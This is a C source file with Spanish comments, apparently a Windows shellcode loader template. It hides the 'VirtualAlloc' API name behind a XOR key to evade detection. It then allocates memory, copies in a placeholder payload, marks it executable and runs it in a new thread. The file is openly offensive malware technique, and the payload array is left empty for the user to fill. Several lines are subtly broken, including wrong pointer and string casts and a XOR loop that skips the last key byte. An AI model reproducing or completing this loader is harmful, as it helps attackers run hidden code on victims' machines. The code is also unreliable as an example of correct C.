#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

unsigned char my_payload[]		= { 0x00 };
unsigned int  my_payload_len    = sizeof(my_payload);

// Arreglo de caracteres que sera usado como contenedor para el nombre de la funcion VirtualAlloc
unsigned char cVirtualAlloc     = {};
unsigned int  cVirtualAllocLen  = sizeof(cVirtualAlloc);

char mySecretKey[] = "meowmeow";

/*
LPVOID VirtualAlloc
(
	LPVOID lpAddress,
	SIZE_T dwSize, 
	DWORD  flAllocationType,
	DWORD  flProtect
);	
*/

// Puntero que almacenara la direccion de VirtualAlloc despues de ser obtenida 
LPVOID (WINAPI* pVirtualAlloc)
(
	LPVOID lpAddress, 
	SIZE_T dwSize, 
	DWORD  flAllocationType, 
	DWORD  flProtect 
);

void XOR(char* data, size_t data_len, char* key, size_t key_len)
{
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++)
	{
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void)
{
	void*	my_payload_mem;
	// Para almacenar el resultado de las operaciones 
	BOOL	rv;
	// Manejador del hilo creado 
	HANDLE  th; 
	// Variable para almacenar los antiguos permisos de memoria
	DWORD   oldprotect = 0;

	// Desencriptamos
	XOR((char*)cVirtualAlloc, cVirtualAllocLen, mySecretKey, sizeof(mySecretKey));
	
	// Obtenemos la direccion de la funcion VirtualAlloc a partir del modulo kernel32.dll
	// el resultado se asigna al puntero pVirtualAlloc
	pVirtualAlloc = GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)cVirtualAlloc);

	my_payload_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
	rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if (rv != 0)
	{
		// Creacion y ejecucion del hilo
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}